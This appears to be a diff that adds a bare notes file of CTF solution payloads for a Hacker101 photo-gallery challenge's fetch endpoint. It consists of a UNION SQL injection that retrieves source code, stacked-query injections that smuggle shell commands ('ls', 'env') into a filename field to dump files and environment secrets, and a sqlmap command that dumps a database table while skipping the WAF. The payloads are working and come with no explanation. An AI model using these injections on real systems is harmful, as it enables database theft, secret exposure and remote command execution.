@@ -1,0 +1,5 @@
+1. ../fetch?id=4 union select 'main.py'--> dockerimage documentation
+2. ../fetch?id=1; update photos set filename='* || ls ./files >temp.txt ' where id=3; commit; --
+3. ../fetch?id=1; update photos set filename='* || env >temp.txt' where id=3; commit; --
+4. sudo sqlmap -u "https://7beab327ff2585388fc070b9756c6889.ctf.hacker101.com/fetch?id=1" --method=GET --dump -D level5 -T photos -p id --code=200 --ignore-code=500 --skip-waf --threads=2 --proxy "http://localhost:8080/" -o
+
